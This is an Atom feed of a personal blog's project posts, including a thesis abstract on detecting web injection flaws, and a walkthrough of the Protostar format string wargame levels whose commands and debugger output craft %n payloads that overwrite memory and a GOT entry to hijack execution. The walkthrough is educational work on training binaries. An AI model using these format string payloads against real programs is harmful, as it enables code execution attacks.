<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: projects | Louis Li]]></title>
  <link href="http://louisrli.github.io/blog/categories/projects/atom.xml" rel="self"/>
  <link href="http://louisrli.github.io/"/>
  <updated>2020-10-09T20:20:45+01:00</updated>
  <id>http://louisrli.github.io/</id>
  <author>
    <name><![CDATA[Louis Li]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Senior Thesis: Security Analysis of Java Web Applications Using String Constraint Analysis]]></title>
    <link href="http://louisrli.github.io/blog/2015/05/03/senior-thesis/"/>
    <updated>2015-05-03 00:00:00 +0100</updated>
    <id>http://louisrli.github.io/blog/2015/05/03/senior-thesis</id>
    <content type="html"><![CDATA[<p>I submitted my undergraduate thesis at the beginning of April, titled “Security Analysis of Java Web
Applications Using String Constraint Analysis.” I was advised by Professor Stephen Chong.</p>

<!-- more -->

<p>Here’s the abstract:</p>

<blockquote>

  <p>Web applications are exposed to myriad security vulnerabilities related to malicious user string
input. In order to detect such vulnerabilities in Java web applications, this project employs string
constraint analysis, which approximates the values that a string variable in a program can take on.
In string constraint analysis, program analysis generates string constraints – assertions about the
relationships between string variables. We design and implement a dataflow analysis for Java
programs that generates string constraints and passes those constraints to the CVC4 SMT solver to
find a satisfying assignment of string variables. Using example programs, we illustrate the
feasibility of the system in detecting certain types of web application vulnerabilities, such as SQL
injection and cross-site scripting.</p>
</blockquote>

<p><a href="/downloads/louisli-thesis.pdf">Download the PDF</a> or view it below.</p>

<embed src="/downloads/louisli-thesis.pdf" type="application/pdf" width="100%" height="600" />

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Erasable Code Contracts]]></title>
    <link href="http://louisrli.github.io/blog/2014/01/09/erasable-contracts/"/>
    <updated>2014-01-09 00:00:00 +0000</updated>
    <id>http://louisrli.github.io/blog/2014/01/09/erasable-contracts</id>
    <content type="html"><![CDATA[<p>This semester, I took a course on the science of cybersecurity, targeted toward an audience with some programming languages background.</p>

<p>A classmate and I had a semester long research project on “erasable” <a href="http://en.wikipedia.org/wiki/Code_contract">code contracts</a>. More details are below.</p>

<p>This was a valuable experience, giving me an opportunity to work on two things that I hadn’t done before:</p>

<ol>
  <li>Proof-based research</li>
  <li>Basic proofs of a calculus. While type soundness proofs and their associated lemmas are core to many calculi, many introductory programming language courses, including the one that I took, skip the details of the proofs.</li>
</ol>

<!-- more -->

<p>Here’s the abstract:</p>

<blockquote>
  <p>Contract programming is a design approach that allows programmers to design formal specifications for software, known as “contracts”. These contracts, executed at runtime, allow programmers to make assertions about the behavior of their software and ensure program correctness. In a language with side-effects, however, it is possible for these contracts to modify memory and consequently change the behavior of the program. While contracts provide the specifications, these specifications clearly should not change the behavior of the program that they enforce. Instead, if the contracts were removed (“erased”), then the behavior of the program should be the same as if the contracts remained. This notion is captured by the idea of erasability. We present a calculus for erasable contracts, establish properties such as type soundness, and prove a formal definition of erasability for the language.</p>
</blockquote>

<p><a href="/downloads/erasable-final.pdf">Download the PDF</a> or view it below. Note that it’s missing some of the grittier nuances of the eta-reductions.</p>

<embed src="/downloads/erasable-final.pdf" type="application/pdf" width="100%" height="600" />

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hungrier: Harvard Dining Menu, Re-released]]></title>
    <link href="http://louisrli.github.io/blog/2013/08/22/hungry-revamped/"/>
    <updated>2013-08-22 00:00:00 +0100</updated>
    <id>http://louisrli.github.io/blog/2013/08/22/hungry-revamped</id>
    <content type="html"><![CDATA[<p>I’ve rewritten and redesigned <a href="http://louisrli.github.io/hungry/">Hungry</a>, a site that filters the noisy Harvard dining menu for relevant entries. If you’re reading this during the school year, there probably won’t be anything, since student dining isn’t open.</p>

<p>This version was written in <a href="http://marionettejs.com">Marionette.js</a>, which has been my client-side framework of choice for the past few months (I’ve been using Meteor for things that require a more involved database). It still retains an obnoxious minimalism, but this time with lowercase text instead of uppercase text.</p>

<p><a href="https://github.com/louisrli/hungry">Source code here</a>, contributions welcome.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2012 in Sideprojects]]></title>
    <link href="http://louisrli.github.io/blog/2013/01/12/sideprojects-2012/"/>
    <updated>2013-01-12 00:00:00 +0000</updated>
    <id>http://louisrli.github.io/blog/2013/01/12/sideprojects-2012</id>
    <content type="html"><![CDATA[<p>It always surprises me how long a year is. It’s hard for me to believe that some of these projects were a year ago, but I’m happy to see my progress. Here’s a walk down memory lane for my projects in 2012, not including course projects and research.</p>

<p><a id="exploits" style="visibility:hidden;"> </a></p>

<h3 id="exploit-exercises-protostar-nebula">Exploit Exercises: Protostar, Nebula</h3>

<dl>
  <dt>Description</dt>
  <dd>A series of security wargames from <a href="http://exploit-exercises.com">Exploit Exercises</a>.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>shell, C, assembly and shellcode, command line tools, compilation and libraries</dd>
  <dt>Other</dt>
  <dd>These were both fun and educational. These problems required a good deal of persistence. Topics ranged from: buffer overflows, shell code, stack layout, library linking, race conditions, format strings, command line tools, networking. I’ve posted the solutions on this site for the format string, stack, and shell exploit sections.</dd>
  <dt>Links</dt>
  <dd><a href="http://louisrli.github.com/sideprojects/2012/06/22/nebula0">Nebula shell solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/18/protostar-stack0">Protostar stack solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/29/protostar-format0">Protostar format solutions</a></dd>
</dl>

<!-- more -->
<p><a id="euler" style="visibility:hidden;"> </a></p>

<h3 id="project-euler">Project Euler</h3>
<dl>
  <dt>Description</dt>
  <dd>A series of mathematical programming problems from <a href="http://projecteuler.net/">Project Euler</a>.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>C++, Scala</dd>
  <dt>Other</dt>
  <dd>Over the winter break of my freshman year (January 2012), I worked on these in C++. I’ll admit that I’m a bit embarrassed of the code I wrote – C++ isn’t the greatest language to use to work on these problems. However, Project Euler is a great way to become familiar with a language. The problems become significantly harder, and I continued with Scala (June 2012 - August 2012).</dd>
  <dt>Links</dt>
  <dd><a href="https://github.com/louisrli/project-euler">code solutions</a></dd>
</dl>

<p><a id="grabrc" style="visibility:hidden;"> </a></p>

<h3 id="grabrc">.grabrc</h3>
<dl>
  <dt>Description</dt>
  <dd>A command-line client for downloading dotfiles from Github, giving a comfortable editing environment from any terminal. It can be installed via <a href="http://www.pip-installer.org/en/latest/">pip</a> (<code class="language-plaintext highlighter-rouge">pip install grabrc-client</code>).</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>Python (client), Scala Play Framework (server)</dd>
  <dt>Other</dt>
  <dd>This was a pretty significant endeavor over the summer. The idea was motivated by my work with Amazon EC2 machines, virtual machines, and random in-house servers. Many times, I had to do work while ssh’d to those machines, but it was less productive without my comfortable shell and emacs environment at hand. sftp’ing files is a bit tedious, so I wrote a client (command-line Python) and a server (RESTful API) for accessing my dotfiles. The server is currently hosted on Heroku. I do, in fact, eat my own dog food, and it’s very handy when setting up new computers.</dd>
  <dt>Links</dt>
  <dd><a href="https://github.com/louisrli/grabrc-server">server source code</a>, <a href="https://github.com/louisrli/grabrc-client">client source code</a>, <a href="http://pypi.python.org/pypi/grabrc-client/">PyPI index</a></dd>
</dl>

<p><a id="shuttleboy" style="visibility:hidden;"> </a></p>

<h3 id="shuttleboy-ios">Shuttleboy iOS</h3>
<dl>
  <dt>Description</dt>
  <dd>A native iOS version of the Harvard shuttle tracker, <a href="http://shuttleboy.cs50.net/">Shuttleboy</a>.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>Objective-C, Cocoa Touch</dd>
  <dt>Other</dt>
  <dd>I worked on this for a few weeks during the winter break of my freshman year (January 2012). I didn’t want to pay for Apple Developer membership on my own, but after a long wait, I’m planning to release it through Rover soon.</dd>
  <dt>Links</dt>
  <dd><a href="/images/shuttleboy-preview.png">screenshots</a></dd>
</dl>

<p><a id="shuttlebaby" style="visibility:hidden;"> </a></p>

<h3 id="shuttlebaby"><a href="http://www.hcs.harvard.edu/~louis/shuttlebaby/">Shuttlebaby</a></h3>
<dl>
  <dt>Description</dt>
  <dd>A website with the next few times between two particular stops on <a href="http://shuttleboy.cs50.net/">Shuttleboy</a>. Can be forked and customized.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>PHP, HTML, CSS</dd>
  <dt>Links</dt>
  <dd><a href="http://www.hcs.harvard.edu/~louis/shuttlebaby/">site</a>, <a href="https://github.com/louisrli/shuttlebaby">source code</a></dd>
</dl>

<p><a id="hungry" style="visibility:hidden;"> </a></p>

<h3 id="hungry"><a href="http://www.hcs.harvard.edu/~louis/hungry/">Hungry</a></h3>
<dl>
  <dt>Description</dt>
  <dd>A website with an obnoxiously concise version of the Harvard dining menu, showing only entrees. Includes an option to sign up and receive daily emails.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>PHP, HTML, CSS</dd>
  <dt>Links</dt>
  <dd><a href="http://www.hcs.harvard.edu/~louis/hungry/">site</a>, <a href="https://github.com/louisrli/hungry">source code</a></dd>
</dl>

<h3 id="jenkins-arbitrary-parameters-plugin">Jenkins Arbitrary Parameters Plugin</h3>
<dl>
  <dt>Description</dt>
  <dd>A plugin for the open-source continuous integration tool [Jenkins] that allows an arbitrary number of string parameters to be passed in as key-value pairs in properties file format.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>Java, Jenkins</dd>
  <dt>Other</dt>
  <dd>Over the summer, one of my first intern projects was constructing a parameterized test framework in Jenkins that would run jobs along a matrix of parameters: operating system, MySQL version, log4cpp version, Java version, etc. Along with some work on the ec2-plugin, this was my first time looking at such a huge codebase. After poking around the Javadocs and Confluence wiki for a substantial amount of time, I wrote this plugin.</dd>
  <dt>Links</dt>
  <dd><a href="https://github.com/louisrli/arbitrary-parameters-plugin">source code</a></dd>
</dl>

<p><a id="louisrligithub" style="visibility:hidden;"> </a></p>

<h3 id="louisrligithubcom"><a href="http://louisrli.github.com">louisrli.github.com</a></h3>
<dl>
  <dt>Description</dt>
  <dd>This site.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>Customized Twitter Bootstrap (HTML/CSS/Javascript), Jekyll, Markdown</dd>
  <dt>Links</dt>
  <dd><a href="https://github.com/louisrli/louisrli.github.com">source code</a>, <a href="http://louisrli.github.com/">site</a></dd>
</dl>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
    <updated>2012-08-29 00:00:00 +0100</updated>
    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>

<h1 id="solutions">Solutions</h1>
<h2 id="format-level-0">Format: Level 0</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> using less than 10 bytes of input.</p>

<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./format0 %64s<span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xef\xbe\xad\xde"'</span><span class="si">)</span>
<span class="go">
you have hit the target correctly :)</span></code></pre></figure>

<!-- more -->
<h2 id="format-level-1">Format: Level 1</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code class="language-plaintext highlighter-rouge">target</code>, to any nonzero value.</p>

<p><code class="language-plaintext highlighter-rouge">target</code> is a global variable. To overwrite it, we first find its address using <code class="language-plaintext highlighter-rouge">obdjump -t</code> (we could also use <code class="language-plaintext highlighter-rouge">nm</code> to save some keystrokes).</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-t</span> format1 | <span class="nb">grep </span>target
<span class="go">08049638 g       0 .bss    00000004            target</span></code></pre></figure>

<p>Next, we need to find where the format function expects the first (missing) argument to the format string.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Starting program: /opt/protostar/bin/format1 AAAA%08x

Breakpoint 1, __printf (format=0xbffff98f "AAAA%08x") at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/10xw $esp
0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
0xbffff788:     0xbffff7b8      0x08048469
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c
(gdb) p 0xbffff98f - 0x0bffff784
$1 = 523</code></pre></figure>

<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string’s characters by <em>n</em> bytes. Adding one more character decrements the address from <code class="language-plaintext highlighter-rouge">0xbffff98f</code> to <code class="language-plaintext highlighter-rouge">0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>

<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code class="language-plaintext highlighter-rouge">printf</code>) rather than <code class="language-plaintext highlighter-rouge">vuln()</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run AAAAA%08x
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/format1 AAAAA%08x

Breakpoint 1, __printf (format=0xbffff98e "AAAAA%08x") at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c</code></pre></figure>

<ul>
  <li><code class="language-plaintext highlighter-rouge">0xbffff784</code>: The first argument to the format string.</li>
  <li><code class="language-plaintext highlighter-rouge">0xbffff997 - n</code>: The first character of the format string, where <code class="language-plaintext highlighter-rouge">n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
</ul>

<p>As seen earlier, the distance between the beginning of the format string (the address of <code class="language-plaintext highlighter-rouge">target</code>) and the first argument to the format string (a starting address for “stack popping” additional arguments) is about 500 bytes.</p>

<p>With a few calculations, we can find the correct offset.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./format1 <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\x38\x96\x04\x08"'</span><span class="si">)</span><span class="s1">'..%128$n'</span>
<span class="go">8..you have modified the target :)</span></code></pre></figure>

<h2 id="format-level-2">Format: Level 2</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code class="language-plaintext highlighter-rouge">target</code>, to <code class="language-plaintext highlighter-rouge">0x40</code>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-t</span> format2 | <span class="nb">grep </span>target
<span class="go">080496e4 g     O .bss   00000004              target</span></code></pre></figure>

<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xe4\x96\x04\x08"'</span><span class="si">)</span>%4<span class="se">\$</span>08x | ./format2
<span class="go">080496e4target is 0 :(</span></code></pre></figure>

<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code class="language-plaintext highlighter-rouge">target</code> occupies four bytes first, and we need another 60 bytes.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xe4\x96\x04\x08"'</span><span class="si">)</span>%60u%4<span class="se">\$</span>n | ./format2
<span class="go">                                                         512you have modified the target :)</span></code></pre></figure>

<h2 id="format-level-3">Format: Level 3</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code class="language-plaintext highlighter-rouge">target</code>, to <code class="language-plaintext highlighter-rouge">0x01025544</code>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-t</span> format3 | <span class="nb">grep </span>target
<span class="go">080496f4 g     O .bss   00000004              target</span></code></pre></figure>

<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break printf
Breakpoint 1 at 0x804837c
(gdb) run
Starting program: /opt/protostar/bin/format3
AAAA
Breakpoint 1, __printf (format=0xbffff5a0 "AAAA\n") at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) info frame
Stack level 0, frame at 0xbffff570:
eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
called by frame at 0xbffff590
source language c.
Arglist at 0xbffff568, args: format=0xbffff5a0 "AAAA\n"
Locals at 0xbffff568, Previous frame's sp is 0xbffff570
Saved registers:
ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
(gdb) x/3xw 0xbffff568
0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
(gdb) x/w 0xbffff570
0xbffff570:     0xbffff5a0
(gdb) p 0xbffff5a0 - 0xbffff570
= 48</code></pre></figure>

<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span>AAAA%12<span class="se">\$</span>x | ./format3
<span class="go">AAAA41414141
target is 00000000 :(</span></code></pre></figure>

<p>Next, we need to change the value of target to <code class="language-plaintext highlighter-rouge">0x01025544</code>. Below is each byte in decimal:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ibase=16; 44"</span> | bc
<span class="go">68
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ibase=16; 55"</span> | bc
<span class="go">85
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ibase=16; 02"</span> | bc
<span class="go">2
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ibase=16; 01"</span> | bc
<span class="go">1</span></code></pre></figure>

<p>Finally, we write values to each of the four bytes of <code class="language-plaintext highlighter-rouge">target</code>:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xf4\x96\x04\x08"'</span><span class="si">)$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xf5\x96\x04\x08"'</span><span class="si">)$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xf6\x96\x04\x08"'</span><span class="si">)$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xf7\x96\x04\x08"'</span><span class="si">)</span><span class="s1">'%52u%12$n%''17u%13$n''%173u%14$n'</span> | ./format3
<span class="go">���                                                   0       3221222848                                                                                                                                                                   3086839796
you have modified the target :))</span></code></pre></figure>

<p>Note that it wasn’t necessary to include the last address, <code class="language-plaintext highlighter-rouge">0x080496f7</code>, since the most significant byte (<code class="language-plaintext highlighter-rouge">0x01</code>) is written as a consequence of the overflow.</p>

<h2 id="format-level-4">Format: Level 4</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code class="language-plaintext highlighter-rouge">hello()</code> by using a format string exploit.</p>

<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'AAAA%4$x'</span> | ./format4
<span class="go">AAAA41414141</span></code></pre></figure>

<p>In order to perform this exploit, we’ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we’ll overwrite the entry of the <code class="language-plaintext highlighter-rouge">exit()</code> function (<code class="language-plaintext highlighter-rouge">0x08049724</code>) with the address of the <code class="language-plaintext highlighter-rouge">hello()</code> function (<code class="language-plaintext highlighter-rouge">0x08048b4</code>).</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-TR</span> format4 | <span class="nb">grep exit</span>
<span class="go">00000000      DF *UND* 00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit
</span><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-t</span> format4 | <span class="nb">grep </span>hello
<span class="go">080484b4 g     F .text  0000001e              hello</span></code></pre></figure>

<p>To confirm that our overwrite works correctly, we run a quick test:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\x24\x97\x04\x08"'</span><span class="si">)</span><span class="s1">'%4$n'</span> <span class="o">&gt;</span> /tmp/format4
<span class="gp">$</span><span class="w"> </span>gdb <span class="nt">-q</span> format4
<span class="go">Reading symbols from /opt/protostar/bin/format4...done.
(gdb) run &lt; /tmp/format4
Starting program: /opt/protostar/bin/format4 &lt; /tmp/format4
</span><span class="gp">$</span>�
<span class="go">Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()</span></code></pre></figure>

<p>Execution jumped to the address <code class="language-plaintext highlighter-rouge">0x00000004</code>, meaning that we’re on the right track. Finally, we use a <strong>short write</strong> (<code class="language-plaintext highlighter-rouge">%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code class="language-plaintext highlighter-rouge">0x0804</code> – only the last two bytes need to be changed.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\x24\x97\x04\x08"'</span><span class="si">)</span><span class="s1">'%33968u%4$hn'</span> | ./format4
<span class="gp">$</span><span class="w">
</span><span class="gp">&lt;lots of whitespace&gt;</span><span class="w">
</span><span class="go">512
                                                                                                                                                                              code execution redirected! you win</span></code></pre></figure>

]]></content>
  </entry>
  
</feed>
